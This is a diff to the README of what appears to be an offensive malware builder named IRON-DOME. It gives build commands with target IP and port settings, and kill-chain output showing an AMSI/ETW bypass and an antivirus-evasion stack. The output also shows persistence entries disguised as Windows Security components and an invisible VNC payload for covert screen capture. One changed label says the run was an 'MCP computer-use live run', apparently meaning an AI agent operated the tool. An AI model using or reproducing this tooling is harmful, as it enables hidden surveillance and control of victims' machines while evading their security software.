@@ -279,7 +279,7 @@ IRON-DOME assembles all research streams into a single deployable package:
 # Build only (8-layer + VADER)
 python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vader
 
-# Full platform demo: Build → Kill Chain (8/8) → CHEYANNE Watch VNC in browser
+# Full platform demo: Build → Kill Chain (10/10) → CHEYANNE Watch VNC in browser
 python iron_dome_builder.py --target 127.0.0.1 --port 4443 --xor 0xFC --vader --full
 ```
 
@@ -307,7 +307,7 @@ Phase 2 — KILL CHAIN  (loopback 127.0.0.1 — Kaspersky LIVE)
   PERSIST [1/3] HKCU\Run\WindowsSecurityUpdate       (reboot-survives)
   PERSIST [2/3] Startup\WindowsSecurityHealth.lnk    (login-persists)
   PERSIST [3/3] schtasks ONLOGON WindowsSecurityMon  (task-survives)
-  VERDICT: PASS  8/8  — IRON-DOME KILL CHAIN GREEN
+  VERDICT: PASS  10/10  — IRON-DOME KILL CHAIN GREEN
 
 Phase 3 — CHEYANNE WATCH / VNC
   [+] VNC invisible PS1 generated (persistent + screen capture)
@@ -333,17 +333,17 @@ Phase 3 — CHEYANNE WATCH / VNC
 
 **Previous session proof strip:**
 
-| Build phase | Kill chain (8/8 PASS) | CHEYANNE Watch VNC |
+| Build phase | Kill chain (10/10 PASS) | CHEYANNE Watch VNC |
 |:-----------:|:---------------------:|:------------------:|
 | ![](showcase/iron_dome_v4_banner.png) | ![](showcase/iron_dome_v4_killchain.png) | ![](showcase/iron_dome_vnc_live_2026-06-26.jpg) |
 
-**v4.0.0 build results (2026-06-26):**
+**v4.0.0 build results (2026-06-26 — MCP computer-use live run):**
 
 ```
 [1/4] C source generated — XOR 0xFC on 9 IP bytes + ISUN magic
       VADER AMSI/ETW bypass code injected
 [2/4] COMPILED — 140,800 bytes (8-layer evasion stack)
-      SHA256: 85a50f82dda09f2e39d66563ae378f960eaf277dd2750c9b49b86044d39c9fc2
+      SHA256: ee2d2162bc35876e02a3f9ceb3132fb42d765d3f586abd3a01b66dd6b4940753
       [1] XOR string obfuscation
       [2] Dynamic API resolution
       [3] Anti-sandbox (timing + screen + disk)
